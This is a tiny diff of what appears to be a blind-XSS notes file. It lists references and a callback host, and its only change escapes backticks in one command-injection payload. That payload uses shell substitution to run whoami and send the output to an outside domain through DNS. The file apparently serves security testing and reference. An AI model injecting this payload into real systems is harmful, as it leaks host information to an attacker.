@@ -40,4 +40,4 @@ Encoder:https://www.w3schools.com/jsref/met_win_atob.asp
 Thanks to:https://ardern.io/2017/12/10/blind-xss/
 
 https://xss.hackyour.app/
-`whoami`.hackyour.app
+\`whoami\`.hackyour.app
